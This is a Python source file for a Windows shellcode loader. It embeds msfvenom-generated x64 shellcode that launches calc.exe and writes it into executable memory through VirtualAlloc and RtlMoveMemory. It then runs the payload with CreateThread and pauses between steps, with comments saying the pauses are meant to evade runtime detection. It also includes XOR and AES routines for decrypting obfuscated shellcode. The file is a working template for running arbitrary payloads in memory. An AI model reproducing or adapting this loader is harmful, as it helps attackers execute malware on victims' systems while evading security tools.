#!/usr/bin/env python3
# Author: @m8r0wn

import sys
import ctypes
import hashlib
from time import sleep
import ctypes.wintypes as wt
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

########################################
# Optional shellcode decryption methods
#     (Currently not in use)
########################################
def DecryptXOR(data, key):
    # python3 shellcrypt.py -e xor -f base64 calc.bin
    data = bytearray(b64decode(data))
    l = len(key)
    keyAsInt = [x for x in map(ord, key)]
    return bytes(bytearray(((data[i] ^ keyAsInt[i % l]) for i in range(0,len(data)))))

def DecryptAES(data, key):
    # python3 shellcrypt.py -e aes -f base64 calc.bin
    data = bytearray(b64decode(data))
    key = bytearray(b64decode(key))
    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
    return cipher.decrypt(pad(data, AES.block_size))

#msfvenom -p windows/x64/exec cmd=calc.exe -f py -o calc.bin
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
buf += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
buf += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
buf += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
buf += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
buf += b"\x78\x65\x00"

try:
    # Function definitions
    kernel32 = ctypes.windll.kernel32

    kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
    kernel32.VirtualAlloc.restype = wt.LPVOID

    kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
    kernel32.CreateThread.restype = wt.HANDLE

    kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
    kernel32.RtlMoveMemory.restype = wt.LPVOID

    kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
    kernel32.WaitForSingleObject.restype = wt.DWORD

    # Start Shellcode loader
    print("[+] Starting shellcode loader:")

    memAddr = kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)
    print('[*] Allocated memory space at: {:08X}'.format(memAddr))

    print('[*] Interval sleep to avoid runtime detection (1/2).')
    sleep(5)

    kernel32.RtlMoveMemory(memAddr, buf, len(buf))
    print('[*] Copied payload into memory.')

    print('[*] Interval sleep to avoid runtime detection (2/2).')
    sleep(5)

    th = kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_void_p(memAddr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    print('[*] Created thread in current process.')

    kernel32.WaitForSingleObject(th, -1)
except KeyboardInterrupt:
    print("[!] Key detected, closing")
    sys.exit(1)
except Exception as e:
    print("[-] Error: {}".format(str(e)))
    sys.exit(0)
